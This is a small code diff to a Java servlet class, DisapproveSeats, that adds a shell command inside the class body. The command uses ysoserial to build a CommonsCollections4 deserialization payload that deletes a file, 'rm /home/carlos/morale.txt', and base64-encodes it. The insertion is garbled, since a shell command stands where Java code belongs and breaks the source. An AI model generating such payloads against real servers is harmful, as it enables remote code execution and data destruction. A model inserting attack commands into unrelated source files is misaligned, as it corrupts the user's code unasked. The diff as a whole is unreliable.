@@ -22,6 +22,8 @@ import javax.servlet.http.HttpServletResponse;
  */
 public class DisapproveSeats extends HttpServlet {
 
+    java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+
 
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response)
